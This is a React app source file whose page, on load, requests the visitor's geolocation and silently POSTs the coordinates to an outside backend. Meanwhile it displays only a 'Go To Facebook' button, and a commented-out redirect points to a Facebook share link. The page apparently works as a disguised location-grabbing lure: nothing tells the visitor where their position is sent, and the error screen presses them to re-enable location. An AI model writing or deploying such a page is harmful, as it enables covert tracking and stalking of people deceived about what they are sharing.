

import './App.css';
import { useEffect, useState } from "react";
import { ClipLoader } from 'react-spinners';

function App() {
  const [status, setStatus] = useState('checking'); // checking, loading, error, done

  const getLocationAndSend = async () => {
    setStatus('loading');
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        try {
          const response = await fetch('https://loac-backend.onrender.com/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude }),
          });

          const data = await response.json();
          console.log('Response from server:', data);

          setStatus('done');
          // window.location.href = "https://www.facebook.com/share/p/1BeRQGnmAG/";
        } catch (error) {
          console.error('Error sending location to server:', error);
          setStatus('error');
        }
      },
      (error) => {
        console.error('Error getting location:', error);
        setStatus('error');
      }
    );
  };

  const checkPermissionAndHandle = async () => {
    if (!navigator.permissions) {
      console.log('Permissions API not supported, fallback to direct request');
      getLocationAndSend();
      return;
    }

    try {
      const result = await navigator.permissions.query({ name: 'geolocation' });
      console.log('Permission state:', result.state);

      if (result.state === 'granted') {
        // Already allowed
        getLocationAndSend();
      } else if (result.state === 'prompt') {
        // First time, will ask user
        getLocationAndSend();
      } else if (result.state === 'denied') {
        console.warn('Location permission denied. Please enable in settings.');
        setStatus('error');
      }

      result.onchange = () => {
        console.log('Permission changed to:', result.state);
      };
    } catch (error) {
      console.error('Error checking permission:', error);
      getLocationAndSend();
    }
  };

  useEffect(() => {
    checkPermissionAndHandle();
  }, []);

  return (
    <div className="h-lvh flex flex-col justify-center items-center gap-4">
      {status === 'loading' && (
        <>
          {/* <p className="font-bold text-xl">Loading your location...</p> */}
          <button className='py-3 px-10 border rounded-sm bg-slate-300 text-black'>Go To Facebook</button>
          {/* <ClipLoader height="30" width="30" color="black" ariaLabel="loading" /> */}
        </>
      )}
      {status === 'error' && (
        <div className="text-center">
          <p className="text-red-500 font-bold">Could not get location.</p>
          <p className="text-sm">Please enable location permissions in your browser settings.</p>
          <button
            className="mt-2 px-4 py-2 bg-blue-500 text-white rounded"
            onClick={checkPermissionAndHandle}
          >
            Retry
          </button>
        </div>
      )}
    </div>
  );
}

export default App;


